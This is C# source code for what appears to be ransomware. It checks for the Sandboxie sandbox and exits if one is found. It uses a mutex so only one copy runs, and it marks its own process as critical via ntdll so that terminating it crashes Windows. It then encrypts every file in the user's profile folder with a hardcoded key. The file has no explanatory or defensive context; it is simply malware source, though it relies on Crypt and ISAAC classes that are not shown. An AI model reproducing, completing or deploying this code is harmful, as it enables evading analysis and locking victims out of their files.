using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace Rewrite
{
    class Program
    {
        [STAThread]
        static void Main()
        {
            int i, x = 0;
            for (i = 0; i < 99999999; i++)
            {
                x++;
            }
            x--;
            if (x == 99999998) Sandboxie();
            RtlSetProcessIsCritical(0, 0, 0);
        }

        static void Encrypt()
        {
            string[] Files =  Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
            ISAAC csprng = Crypt.PrepareKey();
            if (csprng == null) return;
            foreach (string F in Files)
            {
                Crypt.CryptFile(csprng, new byte[] { 0x54, 0x45, 0x53, 0x54, 0x4B, 0x45, 0x59 }, F);
            } return;
        }

        static void Mutex()
        {
            Mutex m = new Mutex(true, "Dupe", out bool x);
            if (!x) Environment.Exit(0); Protect();
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
        static void Protect()
        {
            try
            {
                Process.EnterDebugMode();
                RtlSetProcessIsCritical(1, 0, 0);
            }
            finally
            {
                Encrypt();
            }
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetModuleHandle(string lpModuleName);
        static void Sandboxie()
        {
            if (GetModuleHandle("SbieDll.dll").ToInt32() != 0) Environment.Exit(0); Mutex();
        }
    }
}
